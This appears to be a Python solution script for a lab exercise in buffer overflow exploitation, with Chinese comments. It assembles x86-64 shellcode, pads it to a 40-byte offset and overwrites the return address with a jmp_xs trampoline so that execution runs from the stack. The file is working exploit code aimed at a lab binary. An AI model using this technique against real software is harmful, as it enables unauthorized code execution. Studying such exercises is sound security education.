import struct

# 1. 编写 Shellcode (x86-64)
# 目标：edi = 0x72 (即114), 然后跳转到 func1 (0x401216)
# mov edi, 0x72             -> bf 72 00 00 00
# movabs rax, 0x401216      -> 48 b8 16 12 40 00 00 00 00 00
# jmp rax                   -> ff e0
shellcode = b"\xbf\x72\x00\x00\x00" 
shellcode += b"\x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00"
shellcode += b"\xff\xe0"

# 2. 计算填充长度
# 缓冲区起始于 rbp-0x20，返回地址位于 rbp+0x8
# 偏移量 = 0x20 + 0x8 = 40 字节
padding_len = 40 - len(shellcode)
if padding_len < 0:
    print("Error: Shellcode too long!")
padding = b'A' * padding_len

# 3. 覆盖返回地址为 jmp_xs 的地址
# 这是一个跳板，执行后会跳回我们的栈缓冲区起始处
jmp_xs_addr = 0x401334

# 组合 Payload
payload = shellcode + padding + struct.pack("<Q", jmp_xs_addr)

# 写入文件
with open("input.txt", "wb") as f:
    f.write(payload)

print(f"Payload (length {len(payload)}) written to input.txt")